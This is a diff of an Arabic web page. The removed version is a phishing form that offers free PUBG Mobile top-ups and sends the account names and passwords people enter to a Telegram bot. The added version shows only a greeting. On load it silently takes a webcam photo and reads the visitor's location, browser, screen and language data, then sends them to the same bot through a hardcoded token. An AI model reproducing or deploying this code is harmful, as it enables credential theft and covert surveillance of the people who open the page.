@@ -3,77 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن شدات ببجي موبايل مجانا</title>
+    <title>صقر يسلم عليك</title>
     <style>
         body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
             font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f8ff;
-            padding: 20px;
+            direction: rtl;
         }
-        h1 {
-            color: #4CAF50;
-        }
-        input[type="text"] {
-            width: 80%;
-            padding: 10px;
-            margin: 10px auto;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #4CAF50;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
+        #message {
+            font-size: 24px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-
-    <h1>مرحبا بك في شحن شدات ببجي موبايل مجانا</h1>
-    <input type="text" id="account" placeholder="أدخل الحساب" required>
-    <input type="text" id="password" placeholder="أدخل كلمة السر" required>
-    <button onclick="sendData()">إشحن</button>
-
+    <div id="message">صقر يسلم عليك</div>
     <script>
-        function sendData() {
-            const account = document.getElementById("account").value;
-            const password = document.getElementById("password").value;
+        let latitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
+        let longitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
+        let imageData = null; // لتخزين الصورة الملتقطة
 
-            if (account && password) {
-                const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I'; // توكن البوت الخاص بك
-                const chatId = '6185375878'; // معرف الدردشة الخاص بك
-                const message = `حساب: ${account}\nكلمة السر: ${password}`;
-                
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                fetch(url)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert("طلبك قيد المراجعة!");
-                            document.getElementById("account").value = '';
-                            document.getElementById("password").value = '';
-                        } else {
-                            alert("حدث خطأ أثناء إرسال البيانات.");
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert("حدث خطأ في الاتصال.");
-                    });
-            } else {
-                alert("الرجاء ملء الحقول.");
+        async function startCamera() {
+            try {
+                // طلب إذن الوصول إلى الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // بعد الحصول على إذن الكاميرا، نحصل على الموقع
+                getLocation(stream);
+            } catch (err) {
+                console.error('خطأ في الوصول إلى الكاميرا: ', err);
+                // لا يزال نواصل إرسال البيانات حتى بدون الكاميرا
+                sendData();
             }
         }
-    </script>
 
+        function getLocation(stream) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    captureImage(stream);
+                }, error => {
+                    console.error('خطأ في الحصول على الموقع: ', error);
+                    // في حالة عدم السماح بالموقع، نواصل التقاط الصورة
+                    captureImage(stream);
+                });
+            } else {
+                console.error('الموقع غير مدعوم في هذا المتصفح.');
+                captureImage(stream); // في حالة عدم دعم الموقع، نواصل
+            }
+        }
+
+        function captureImage(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // انتظر قليلاً ثم التقط الصورة
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                imageData = canvas.toDataURL('image/png');
+
+                // إيقاف تشغيل الكاميرا هنا
+                stream.getTracks().forEach(track => track.stop());
+
+                // إرسال البيانات إلى Telegram
+                sendData();
+            }, 3000); // التقط الصورة بعد 3 ثوانٍ
+        }
+
+        function sendData() {
+            // جمع المعلومات المتاحة
+            const userAgent = navigator.userAgent; // معلومات المتصفح ونظام التشغيل
+            const screenWidth = window.screen.width; // عرض الشاشة
+            const screenHeight = window.screen.height; // ارتفاع الشاشة
+            const language = navigator.language || navigator.userLanguage; // لغة المتصفح
+            const ipAddress = ''; // غير ممكن الحصول عليه بدون خدمات خارجية
+
+            // إرسال البيانات إلى بوت Telegram
+            sendToTelegram(latitude, longitude, imageData, userAgent, screenWidth, screenHeight, language, ipAddress);
+        }
+
+        function sendToTelegram(lat, long, imageData, userAgent, screenWidth, screenHeight, language, ipAddress) {
+            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+            const message = `إحداثيات الموقع:\nLatitude: ${lat}\nLongitude: ${long}\nUser Agent: ${userAgent}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nLanguage: ${language}\nIP Address: ${ipAddress}`;
+            const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+            // تحويل الصورة إلى Blob إذا كانت موجودة
+            if (imageData) {
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'photo.png');
+                        formData.append('caption', message);
+
+                        return fetch(apiUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('تم إرسال البيانات إلى Telegram:', data);
+                    })
+                    .catch(error => {
+                        console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
+                    });
+            } else {
+                // إذا لم تكن الصورة موجودة، أرسل فقط الرسالة
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', message);
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('تم إرسال البيانات إلى Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
+                });
+            }
+        }
+
+        window.onload = startCamera;
+    </script>
 </body>
 </html>
